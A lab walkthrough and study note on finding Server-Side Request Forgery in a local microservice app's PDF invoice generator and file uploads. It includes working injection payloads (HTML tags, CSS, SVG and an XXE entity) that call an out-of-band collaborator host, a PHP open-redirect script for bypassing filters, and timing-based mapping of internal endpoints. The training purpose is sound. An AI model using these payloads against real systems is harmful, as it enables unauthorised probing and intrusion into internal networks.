# Advanced SSRF Lab Walkthrough and Methodology

## High-Level Summary

This note provides a **comprehensive walkthrough of a microservice lab** vulnerable to **Server-Side Request Forgery (SSRF)**. It includes a detailed breakdown of:
- Functional areas of the app
- SSRF testing in PDF generation
- SSRF via file upload
- Advanced payload crafting
- Filter and redirect bypass techniques
- A challenge that involves **mapping internal microservices via SSRF**

This is a **core topic** in modern web app testing and highly likely to appear in real-world assessments and exams.

---

## 1. Lab Initialization and Application Overview

### Setup Steps:
- Navigate to the root project:
```bash
cd labs/OSLab-2-microservice-packaged
npm install
````

- Install dependencies in:
    
    - `admin-frontend/`
        
    - `customer-frontend/`
        
- Start all services:
    

```bash
npm run start:all
```

### Services and Ports:

- Microservices: `localhost:3000`
    
- Customer Frontend: `localhost:3001`
    
- Admin Frontend: `localhost:3002`
    

> [!info]  
> This lab **intentionally lacks authentication and access control** to simplify SSRF testing. All endpoints are directly accessible.

---

## 2. Application Features and Structure

### Customer Portal (`3001`)

- View available products
    
- Place orders
    
- View and print invoices (PDF)
    
- Check service status (microservice health)
    

### Admin Portal (`3002`)

- Dashboard (stock, order stats)
    
- Invoice and order management
    
- Product management (add/update stock)
    
- Invoice filtering and printing
    

### API Testing (`3000`)

Direct requests (e.g., `localhost:3000/api/pdf/status`) reveal the **active microservices**, though these should be **mapped indirectly** when testing externally.

> [!tip]  
> In a real assessment, test **only through the customer portal** as if you're a **black-box attacker** with no internal access.

---

## 3. Server-Side Rendering and SSRF

> [!info]  
> PDF generation is **server-side**, and user-controlled input is embedded in the invoice—making this a prime SSRF target.

### Key Concept:

Whenever **user input is rendered into documents or templates**, test for:

- HTML injection
    
- Script injection
    
- Resource inclusion (e.g., images, audio, video)
    

### Common Payloads:

```html
<!-- Basic HTML Injection -->
<img src="http://<collaborator>" />
<script src="http://<collaborator>"></script>
<iframe src="http://<collaborator>"></iframe>
<link href="http://<collaborator>" rel="stylesheet" />
<object data="http://<collaborator>"></object>
<audio src="http://<collaborator>"></audio>
<video src="http://<collaborator>"></video>
<embed src="http://<collaborator>"></embed>

<!-- CSS-based SSRF -->
<div style="background:url(http://<collaborator>)"></div>
```

> [!note]  
> Input these payloads in fields like **email** or **shipping address**, then trigger the **PDF generation** to verify SSRF behavior.

---

## 4. Burp Suite Configuration

- Launch **Burp Collaborator**.
    
- Intercept order submission using **Burp's browser**.
    
- Send the `POST /orders` request to **Repeater**.
    
- Insert SSRF payloads into fields.
    
- Use **Intruder** to rotate through payload types:
    
    - `img`, `script`, `div`, `object`, `audio`, etc.
        

> [!warning]  
> The PDF is **not generated immediately after submission**—you must **manually trigger PDF generation** via the “Generate PDF” button.

---

## 5. SSRF Validation & Observations

### Confirmation:

- Collaborator shows **DNS and HTTP requests** upon PDF generation.
    
- PDF output contains **embedded resource references**, confirming SSRF.
    

### Limitations:

- Blind SSRF (no response visible) is common.
    
- Occasionally, PDFs show actual Collaborator content—this improves demonstrability and impact.
    

> [!info]  
> Finding SSRF with **visible output** allows for stronger PoCs, especially in bug bounty or red team reports.

---

## 6. SSRF via File Upload

> [!tip]  
> File uploads can trigger SSRF **during metadata parsing** or **content transformation**.

### Techniques:

- Inject URLs in **EXIF metadata** (e.g., JPEG, PNG)
    
- Upload **SVGs** with embedded resource references
    
- Use **XML-based file formats** with XXE or remote references
    

#### SVG Payload:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://<collaborator>" />
</svg>
```

#### XXE-like XML Payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://<collaborator>">
]>
<foo>&xxe;</foo>
```

---

## 7. Filter Bypass Techniques

> [!note]  
> Basic SSRF filters can often be bypassed using encoding, redirects, or payload obfuscation.

### Resources:

- Use **payloads from Sw33tS0up’s repo**:
    
    ```
    github.com/swisskyrepo/PayloadsAllTheThings
    ```
    

> [!warning]  
> Filter bypasses are **less effective in hardened environments**, but **still valuable in labs or CTFs**.

### Example: Redirect-Based Bypass

1. Host a redirector on a domain allowed by the target.
    
2. Forward requests to disallowed internal locations.
    

```php
<?php
header("Location: " . $_GET["url"]);
?>
```

**Exploit flow**:

```
http://your-redirector.com/redirect.php?url=http://localhost:3000/api/secret
```

Use when SSRF filters only allow listed domains.

---

## 8. Challenge: Advanced SSRF Mapping

### Objective:

Find an SSRF **outside of the PDF generator** using only `http://localhost:3001` (customer portal).

### Steps:

- Identify URL parameters, forms, or SSR vectors.
    
- Use **Collaborator** to detect OOB interactions.
    
- Use SSRF to **map internal services**, especially:
    
    - `http://localhost:3000` (API)
        
    - `http://localhost:3002` (Admin portal)
        

> [!tip]  
> Track behavior differences between:
> 
> - Valid internal endpoints (faster response)
>     
> - Invalid or non-existent endpoints (slower or timeout)
>     

> [!info]  
> Use **timing attacks** to detect SSRF response behavior when no output is returned.

---

## 9. Tools and Techniques

### 🔧 Burp Suite

- Use **Collaborator** and **Repeater** for payload testing.
    
- **Intruder**: rotate payloads across injection points.
    
- **Proxy**: intercept and analyze form behavior.
    

### 🔧 Webhook.site or Interact.sh

- Alternative OOB interaction collectors.
    

### 🔧 Payload Collections

- Swissky’s PayloadsAllTheThings:
    
    - SSRF
        
    - Filter bypasses
        
    - SVG/EXIF/XXE payloads
        

### 🔧 Custom Redirector

- Host simple redirect scripts on attacker-controlled domains to evade filters.
    

---

## Final Notes

- **SSRF via document generation** is a powerful but often overlooked vector.
    
- Test every backend-modified or rendered component.
    
- Use **OOB techniques** and **redirect-based bypasses** when filtering is in place.
    
- The SSRF challenge prepares you for real-world scenarios where discovery and mapping via indirect vectors are critical.
    

> [!important]  
> Use SSRF not just for exploitation—but as a **reconnaissance tool** to map internal systems, validate endpoint existence, and expand attack surface.

In the next section, we'll explore how to demonstrate **real-world impact** using SSRF, such as accessing metadata endpoints and internal APIs.

---
## 10. SSRF as Reconnaissance

> [!info]  
> SSRF can be used not only for exploitation but also as a **discovery tool** to map out internal services and APIs that are not accessible from the outside.

### Key Concept:

SSRF lets you make requests **from the server itself**, which may have access to **internal services** (e.g., `localhost`, `127.0.0.1`, or other microservices). This allows attackers to:

- **Enumerate hidden endpoints**
    
- **Discover internal admin panels or APIs**
    
- **Bypass firewall restrictions**
    

---

### How to Map Internal Endpoints:

1. **Inject SSRF payloads** targeting internal ports and paths:
    
    ```
    http://localhost:3000/api/orders
    http://localhost:3002/dashboard
    http://127.0.0.1:3000/api/invoices
    ```
    
2. **Observe the behavior**:
    
    - Fast response → Likely exists
        
    - Slow or timeout → Might not exist
        
    - DNS/HTTP hit in Collaborator → Confirmed SSRF interaction
        
3. **Use Timing Attacks**:
    
    - Measure differences in response time to guess which internal endpoints are valid.
        
    - Helps when responses are blind (no data is returned).
        

---

### Practical Use Case:

When scoped to `localhost:3001` (customer portal), you can:

- Inject SSRF payloads in fields like **email** or **shipping address**
    
- Trigger server-side actions (e.g., PDF generation)
    
- Monitor **Burp Collaborator** or **Webhook.site** for outbound requests
    
- Gradually **build a map** of internal API endpoints (`3000`) and admin portals (`3002`)
    

---

> [!tip]  
> This is especially powerful when chained with other vulnerabilities (like IDOR or Broken Access Control) on internal routes.

> [!important]  
> Think of SSRF as a **proxy scanner** — you're using the vulnerable server to probe **its own internal network**.

---